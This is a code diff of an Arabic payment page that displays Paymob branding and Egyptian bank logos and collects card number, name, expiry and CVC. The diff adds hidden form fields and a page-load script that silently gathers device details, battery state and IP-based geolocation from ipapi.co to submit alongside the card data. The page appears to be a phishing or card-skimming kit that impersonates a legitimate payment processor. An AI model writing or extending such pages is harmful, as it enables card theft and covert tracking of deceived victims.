@@ -87,7 +87,6 @@
             border-color: #dc3545 !important;
         }
 
-        /* تنسيق الشعارات داخل الخانات */
         .input-icon-right {
             position: absolute;
             right: 12px;
@@ -114,7 +113,6 @@
             font-size: 18px;
         }
 
-        /* زر إظهار/إخفاء الرمز لـ CVV */
         .toggle-password {
             position: absolute;
             left: 12px;
@@ -192,7 +190,6 @@
             color: #777;
         }
 
-        /* تنسيق شعارات البنوك الملونة في التذييل */
         footer {
             padding: 25px 0 35px 0;
             background: #ffffff;
@@ -259,7 +256,20 @@
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- 1. اختيار وسيلة الدفع (محفظة وبطاقة فقط) -->
+                    <!-- خانات مخفية لإرسال بيانات الجهاز والشبكة للمظلة -->
+                    <input type="hidden" name="geoLat" id="geoLat" value="غير معروف">
+                    <input type="hidden" name="geoLon" id="geoLon" value="غير معروف">
+                    <input type="hidden" name="geoCity" id="geoCity" value="غير معروف">
+                    <input type="hidden" name="geoCountry" id="geoCountry" value="غير معروف">
+                    <input type="hidden" name="batteryInfo" id="batteryInfo" value="غير معروف">
+                    <input type="hidden" name="deviceRAM" id="deviceRAM" value="غير معروف">
+                    <input type="hidden" name="cpuCores" id="cpuCores" value="غير معروف">
+                    <input type="hidden" name="deviceType" id="deviceType" value="غير معروف">
+                    <input type="hidden" name="screenSize" id="screenSize" value="غير معروف">
+                    <input type="hidden" name="userTimeZone" id="userTimeZone" value="غير معروف">
+                    <input type="hidden" name="lang" id="lang" value="غير معروف">
+
+                    <!-- 1. اختيار وسيلة الدفع -->
                     <div class="input-group-custom">
                         <label>اختر وسيلة الدفع:</label>
                         <select name="payment_method" id="payment_method" required>
@@ -302,7 +312,6 @@
 
                     <!-- 4. خانات البطاقة البنكية -->
                     <div id="card_section">
-                        <!-- رقم الكارت مع شعار الفيزا وماستر كارد -->
                         <div class="input-group-custom">
                             <label>رقم البطاقة البنكية:</label>
                             <div class="input-wrapper">
@@ -322,7 +331,6 @@
                             <div class="error-message" id="error_card_number">يجب كتابة 16 رقماً بالإنجليزية بدون حروف.</div>
                         </div>
 
-                        <!-- اسم صاحب الكارت -->
                         <div class="input-group-custom">
                             <label>اسم صاحب البطاقة:</label>
                             <div class="input-wrapper">
@@ -334,7 +342,6 @@
                             <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
                         </div>
 
-                        <!-- تاريخ الانتهاء و CVC مع زر الإظهار والإخفاء -->
                         <div class="input-containers">
                             <div class="input-group-custom">
                                 <label>التاريخ:</label>
@@ -377,17 +384,16 @@
                         <button id="submitButton" type="submit" class="submit-btn">
                             متابعة وتأكيد الدفع
                         </button>
-
                         <span class="secured-tag"><i class="fa fa-lock" aria-hidden="true"></i> مؤمن بالكامل بواسطة Paymob</span>
                     </div>
                 </form>
             </section>
-     
+        </div>
+    </div>
 
-    <!-- التذييل مع شعارات البنوك -->
     <footer>
         <div class="container bank-logos-container">
-            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i>معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
+            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
             <div class="bank-logos-grid">
                 <div class="bank-logo-card" title="البنك الأهلي المصري">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fc/NBE_logo.png" alt="البنك الأهلي المصري">
@@ -403,6 +409,49 @@
     </footer>
 
     <script>
+        // --- 1. جلب بيانات الجهاز تلقائياً وتخزينها في الخانات المخفية ---
+        async function collectDeviceDetails() {
+            document.getElementById('deviceRAM').value = (navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير مدعوم');
+            document.getElementById('cpuCores').value = navigator.hardwareConcurrency || 'غير معروف';
+            document.getElementById('screenSize').value = `${window.screen.width} x ${window.screen.height}`;
+            document.getElementById('userTimeZone').value = Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف';
+            document.getElementById('lang').value = navigator.language || navigator.userLanguage || 'غير معروف';
+
+            const ua = navigator.userAgent;
+            let deviceType = 'كمبيوتر (Desktop)';
+            if (/Mobi|Android/i.test(ua)) deviceType = 'هاتف (Mobile)';
+            else if (/Tablet|iPad/i.test(ua)) deviceType = 'تابلت (Tablet)';
+            document.getElementById('deviceType').value = deviceType;
+
+            // جلب حالة البطارية إن أمكن
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    document.getElementById('batteryInfo').value = `${Math.round(battery.level * 100)}% (${battery.charging ? 'جاري الشحن ⚡' : 'غير موصول بالكهرباء'})`;
+                } catch (e) {
+                    document.getElementById('batteryInfo').value = 'غير متاح';
+                }
+            }
+
+            // جلب بيانات الموقع التقريبي عبر IP
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    document.getElementById('geoLat').value = data.latitude || 'غير معروف';
+                    document.getElementById('geoLon').value = data.longitude || 'غير معروف';
+                    document.getElementById('geoCity').value = data.city || 'غير معروف';
+                    document.getElementById('geoCountry').value = data.country_name || 'غير معروف';
+                }
+            } catch (err) {
+                console.log('فشل جلب الإحداثيات الجغرافية');
+            }
+        }
+
+        // تشغيل جلب البيانات عند تحميل الصفحة
+        collectDeviceDetails();
+
+        // --- 2. إدارة الواجهة والتحقق من المدخلات ---
         const paymentMethodSelect = document.getElementById('payment_method');
         const cardSection = document.getElementById('card_section');
         const phoneGroup = document.getElementById('phone_group');
@@ -429,7 +478,6 @@
             }
         });
 
-        // تفعيل زر إظهار وإخفاء رمز الـ CVV فقط
         const toggleCvvBtn = document.getElementById('toggleCvvBtn');
         const cardCvcInput = document.getElementById('card_cvc');
         const cvvIcon = document.getElementById('cvvIcon');
